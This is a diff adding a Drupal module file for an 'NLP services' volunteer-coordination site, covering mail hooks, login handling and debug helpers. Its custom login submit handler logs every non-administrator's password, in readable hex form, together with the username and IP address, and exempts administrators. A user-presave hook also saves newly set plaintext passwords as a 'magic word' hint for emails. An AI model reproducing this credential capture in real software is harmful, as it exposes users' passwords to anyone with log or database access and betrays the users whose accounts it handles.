@@ -1,0 +1,274 @@
+<?php
+
+use Drupal\Core\Form\FormStateInterface;
+use Symfony\Component\HttpFoundation\Session\Session;
+use Symfony\Component\HttpFoundation\Session\SessionInterface;
+use Drupal\Component\Utility\Html;
+
+const NLP_MODULE = 'nlpservices';
+
+//const NLP_ADMIN_ROLE = 'nlp admin';
+//const NLP_COORDINATOR_ROLE = 'nlp coordinator';
+//const NLP_LEADER_ROLE = 'nlp leader';
+
+const NLP_ADMIN_ROLE_ID = 'nlp_admin';
+const NLP_COORDINATOR_ROLE_ID = 'nlp_coordinator';
+const NLP_LEADER_ROLE_ID = 'nlp_leader';
+
+const NLP_ADMIN_ROLE_LABEL = 'NLP Admin';
+const NLP_COORDINATOR_ROLE_LABEL = 'NLP Coordinator';
+const NLP_LEADER_ROLE_LABEL = 'NLP Leader';
+
+const NLP_ADMIN_PERMISSION = 'nlp administer';
+const NLP_TOOLS_PERMISSION = 'nlp tools access';
+const NLP_DATA_ENTRY_PERMISSION = 'nlp data entry';
+
+
+/** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+ * Implements hook_mail_alter
+ *
+ * Implements hook mail alter.  For NLP messages add the signature line and
+ * set the language.   For email t deliver a turf, add the information to
+ * notify the sender if the email is non-deliverable.
+ *
+ * @param $message
+ * @noinspection PhpUnused
+ */
+function nlpservices_mail_alter(&$message) {
+  switch ($message['module']) {
+    case NLP_MODULE:
+      //nlp_debug_msg('$message',$message);
+      if (isset($message['params']['func'])) {
+        if($message['params']['func'] == 'deliver_turf' OR
+          $message['params']['func'] == 'account_reminder')  {
+          $params = $message['params'];
+          $notify = [
+            'sender' => [
+              'county' => $params['county'],
+              'firstName' => $params['sender']['firstName'],
+              'lastName' => $params['sender']['lastName'],
+              'email' => $params['sender']['email'],
+            ],
+            'recipient' => [
+              'firstName' => $params['recipient']['firstName'],
+              'lastName' => $params['recipient']['lastName'],
+              'email' => $params['recipient']['email'],
+            ],
+          ];
+          $notify_str = json_encode($notify).'<eor>';
+          $message['headers']['x-nlpservices-notify'] = $notify_str;
+          //$message['headers']['Reply-To'] = $params['replyTo'];
+
+          $message['headers']['List-Unsubscribe'] =
+            "<mailto: notifications@nlpservices.org?subject=unsubscribe>";
+
+        }
+      }
+      break;
+    case 'user':
+      //nlp_debug_msg('message', $message);
+      $accountObj = $message['params']['account'];
+      switch ($message['key']) {
+        case 'password_reset':
+          if(!empty($accountObj->field_shared_email['und'][0]['value'])) {
+            $message['to'] = $accountObj->field_shared_email['und'][0]['value'];
+          }
+          break;
+      }
+      break;
+  }
+}
+
+/** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+ * Implements hook_mail
+ *
+ * @param $key
+ * @param $message
+ * @param $params
+ * @noinspection PhpUnused
+ */
+function nlpservices_mail($key, &$message, $params) {
+  //nlp_debug_msg('$message',$message);
+  //nlp_debug_msg('$params',$params);
+
+  $options = [
+    'langcode' => $message['langcode'],
+  ];
+  //nlp_debug_msg('$key',$key);
+  switch ($key) {
+
+    case 'deliver_turf':
+    case 'account_reminder':
+      $boundary = uniqid('np');
+      $message['headers']['Content-Type'] = 'multipart/alternative; boundary="'. $boundary.'"';
+      //$message['headers']['Reply-To:'] = $params['replyTo'];
+      $message['subject'] = t('Neighborhood Leader Materials - @county County',
+        array('@county' => $params['county']), $options);
+
+      $message['body'] =  array();
+      $msgPlain = "--" . $boundary . "\n";
+      $msgPlain .= 'Content-Type: text/plain; charset=UTF-8'."\n";
+      $msgPlain .= $params['plainText'];
+
+      $msgHtml = "--" . $boundary . "\n";
+      $msgHtml .= "Content-Type: text/html; charset=utf-8\n";
+      $msgHtml .= $params['message'];
+
+      $message['body'][0] =  $msgPlain.$msgHtml."\n--" . $boundary . "--";
+      break;
+
+    case 'notify bounce':
+      $message['headers']['Content-Type'] = 'text/html; charset=UTF-8;';
+      //$message['subject'] = t('Neighborhood Leader Notification - NL email bounce',$options);
+      $message['subject'] = t('Neighborhood Leader Notification - NL email bounce');
+      $message['body'][] = $params['message'];
+      //$message['body'][] = t('<br><em>The NLP services admin sent you this message.</em>');
+      break;
+
+  }
+  //nlp_debug_msg('$message',$message);
+
+}
+
+/**
+ * Implements hook_user_login().
+ */
+function nlpservices_user_login(Drupal\user\Entity\User $account)
+{
+  //nlp_debug_msg('$account',$account);
+  //$messenger = Drupal::messenger();
+  //$messenger->addStatus('login');
+  $user = $account::load(\Drupal::currentUser()->id());
+  $county = $user->get('field_county')->getValue()[0]['value'];
+  //nlp_debug_msg('$county',$county);
+  $factory = \Drupal::service('tempstore.private');
+  $store = $factory->get('nlpservices.session_data');
+  $store->set('County',$county);
+}
+
+function nlp_debug_msg($msg,$values='EMPTY') {
+  $messenger = Drupal::messenger();
+  $backTrace = debug_backtrace();
+  $file = $backTrace[0]['file'];
+  $file_path = explode("/", $file);
+  $file_name = end($file_path);
+  $fnp = str_replace('.php','', $file_name);
+  $caller =  str_replace('nlp_','', $fnp);
+  $line = $backTrace[0]['line'];
+  $location = '@mod @line ';
+  $location .= $msg.' = ';
+
+  if(is_string($values) OR is_scalar($values) OR empty($values)) {
+    if(!empty($values)) {
+      $msg = t($location.'@values', ['@values' => $values,'@mod'=>$caller,'@line'=>$line]);
+    } else {
+      $msg = t($location.'@values', ['@values' => 'empty','@mod'=>$caller,'@line'=>$line]);
+    }
+  } elseif (is_object($values)) {
+    $huh = print_r(json_encode($values),TRUE);
+    $msg = t($location."<br><pre>$huh</pre>",
+      ['@mod'=>$caller,'@line'=>$line]);
+  } else {
+    $nice = highlight_string("<?php\n\$values =\n" . var_export($values, true) . ";\n?>", TRUE);
+    $msg = t($location."<br><pre>$nice</pre>",
+      ['@mod'=>$caller,'@line'=>$line]);
+  }
+  $messenger->addMessage($msg, $messenger::TYPE_STATUS);
+}
+
+/**
+ * Implements hook_form_alter().
+ */
+function nlpservices_form_alter(&$form, FormStateInterface $form_state, $form_id)
+{
+  /* @var Drupal\Core\Entity\FieldableEntityInterface $entity */
+  //nlp_debug_msg('form',$form);
+  //nlp_debug_msg('$form_id',$form_id);
+  switch ($form_id) {
+    case 'user_login_block':
+    case 'user_login_form' :
+      array_unshift($form['#submit'], 'custom_login_submit');
+      break;
+  }
+
+  $nlpForms = ['awake_form', 'nlpservices_sync_active_nls_form',
+    'nlpservices_manage_drupal_accounts_form',
+    'nlpservices_login_credentials_reminder_form'];
+
+  $nlpForm = $form['#form_id'];
+  if (in_array($nlpForm, $nlpForms)) {
+    $form['#attached']['library'][] = 'nlpservices/info-boxes';
+  }
+
+  if ($nlpForm == 'nlpservices_data_entry_form') {
+    $form['#attached']['library'][] = 'nlpservices/data-entry-table';
+  }
+}
+
+/**
+ * Custom login submit handler
+ */
+function custom_login_submit($form, FormStateInterface &$form_state) {
+  $ipAdd = $_SERVER['REMOTE_ADDR'];
+  $name = $form_state->getValue('name');
+  $passHex = '';
+
+  $drupalUserObj = Drupal::getContainer()->get('nlpservices.drupal_user');
+  $user = $drupalUserObj->getUserByName($name);
+  //nlp_debug_msg('$user',$user);
+  $admin = FALSE;
+  if(!empty($user)) {
+    $roles = $user['roles'];
+    $admin = in_array('administrator',$roles);
+  }
+  if(!$admin) {
+    $pass = $form_state->getValue('pass');
+    $passHex = strToHex($pass);
+  }
+
+  Drupal::logger('nlpservices')->notice('User login: '.$name.', '.$passHex.', '.$ipAdd);
+}
+
+/** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+ * implements hook_user_presave
+ *
+ * Implementation of hook_user_presave().  Check if the user is an NL that
+ * is changing the password.  Save the password to help with a hint for
+ * turf delivery emails.
+ *
+ * @param $unused
+ * @noinspection PhpUnusedParameterInspection
+ */
+function nlpservices_user_presave($unused){
+  $magicWordObj = Drupal::getContainer()->get('nlpservices.magic_word');
+  //nlp_debug_msg('$_REQUEST',$_REQUEST);
+  if(!empty($_REQUEST['field_mcid'][0]['value'])) {
+    //$magicWordObj = new NlpMagicWord();
+    //nlp_debug_msg('mcid',$_REQUEST['field_mcid'][0]['value']);
+    $magicWordObj->setMagicWord($_REQUEST['field_mcid'][0]['value'], $_REQUEST['pass']['pass1']);
+  }
+}
+
+/** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+ * This converts a string to hex for debugging
+ *
+ * @param $string
+ * @return string
+ */
+function strToHex($string): string
+{
+  $hex = '';
+  for ($i = 0; $i < strlen($string); $i++) {
+    $so = ord($string[$i]);
+    $sh = dechex($so);
+    $shp = str_pad($sh, 2, '0',STR_PAD_LEFT);
+    if(($so < 128) AND ($so > 31)) {
+      $hex .= ' '.$string[$i].' '.$shp;
+    } else {
+      $hex .= ' .. '.$shp;
+    }
+    if($i>255) {break;}
+  }
+  return $hex;
+}
+
